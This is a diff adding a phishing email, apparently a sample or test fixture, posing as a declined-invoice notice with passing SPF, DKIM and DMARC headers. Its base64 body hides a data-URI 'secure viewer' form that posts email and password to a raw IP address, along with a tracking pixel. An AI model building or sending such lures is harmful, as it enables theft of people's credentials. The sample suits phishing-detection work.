@@ -1,0 +1,23 @@
+From: Billing Center <billing@cloud-invoice.example>
+To: victim@example.org
+Subject: Invoice #8841 - payment declined
+Date: Wed, 7 Oct 2026 09:15:00 +0000
+Message-ID: <inv8841@cloud-invoice.example>
+Authentication-Results: mx.example.org; spf=pass smtp.mailfrom=billing@cloud-invoice.example; dkim=pass header.d=cloud-invoice.example; dmarc=pass header.from=cloud-invoice.example
+Received: from smtp.cloud-invoice.example (smtp.cloud-invoice.example [203.0.113.44]) by mx.example.org with ESMTPS id q3; Wed, 7 Oct 2026 09:15:44 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PHA+WW91ciBpbnZvaWNlIGlzIGF0dGFjaGVkIGJlbG93LiBPcGVuIHRoZSBz
+ZWN1cmUgdmlld2VyOjwvcD4KPGEgaHJlZj0iZGF0YTp0ZXh0L2h0bWw7YmFzZTY0LFBHaDBiV3cr
+UEdKdlpIaytQSEErVTJWamRYSmxJR1J2WTNWdFpXNTBJSFpwWlhkbGNqd3ZjRDQ4Wm05eWJTQmhZ
+M1JwYjI0OUltaDBkSEE2THk4eE9EVXVNVGs1TGpFd015NDVMMk52Ykd4bFkzUWlJRzFsZEdodlpE
+MGlVRTlUVkNJK1BHbHVjSFYwSUc1aGJXVTlJbVZ0WVdsc0lqNDhhVzV3ZFhRZ2RIbHdaVDBpY0dG
+emMzZHZjbVFpSUc1aGJXVTlJbkJoYzNNaVBqeHBibkIxZENCMGVYQmxQU0p6ZFdKdGFYUWlJSFpo
+YkhWbFBTSldaWEpwWm5raVBqd3ZabTl5YlQ0OEwySnZaSGsrUEM5b2RHMXNQZz09Ij5TZWN1cmUg
+dmlld2VyPC9hPgo8ZGl2PjxhIGhyZWY9Imh0dHA6Ly9pbnZvaWNlLXZpZXcuZXhhbXBsZS92Lzg4
+NDEiPlZpZXcgaW52b2ljZTwvYT48L2Rpdj4KPGltZyBzcmM9Imh0dHA6Ly9tZXRyaWNzLmNsb3Vk
+LWludm9pY2UuZXhhbXBsZS9wLnBuZz9pPTg4NDEiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiPgo8L2Jv
+ZHk+PC9odG1sPg==
+
